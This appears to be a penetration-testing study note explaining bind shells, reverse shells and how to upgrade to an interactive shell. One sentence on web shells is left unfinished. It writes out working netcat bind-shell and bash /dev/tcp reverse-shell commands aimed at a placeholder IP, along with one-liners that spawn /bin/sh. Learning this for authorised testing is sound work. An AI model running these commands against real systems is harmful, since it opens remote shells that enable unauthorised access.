---
MOC: "[[Offensive Security Concepts MOC]]"
---
-- --
A shell gives a user a text interface to the computer. This is a common goal of a penetration test to get greater access to the system for [[enumeration]] and [[Linux Privilege Escalation|Linux]]/[[Windows Privilege Escalation|Windows]] privilege escalation.

A web shell is a shell accessible from the browser to run commands, and is often an 

A bind shell runs on the target to listen to connections, and is much more likely to be blocked by firewalls.
```shell
# Target
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> 7777 > /tmp/f

# Local
$ nc -nv <IP> 7777
```

A reverse shell runs on the local system, and the target reaches back to the local system to connect, making it less likely to be blocked by firewalls, especially with common outbound ports. There are [many payloads](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) to create reverse shells.

```shell
# Local
$ sudo nc -lvnp 443

# Target
$ /bin/bash -l > /dev/tcp/<IP>/443 0<&1 2>&1
```

# Interactive Mode
Many shells spawned from attacks are not in interactive mode, which is important for some commands, like `sudo`, which require interactive input. There are many ways to spawn this mode, depending on the language used, which can be used to escalate privileges.

```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ /bin/sh -i
$ perl -e 'exec "/bin/sh";'
$ ruby: exec "/bin/sh"
$ lua: os.execute('/bin/sh')
$ awk 'BEGIN {system("/bin/sh")}'
$ find . -exec /bin/sh \; -quit
$ vim -c ':!/bin/sh'
```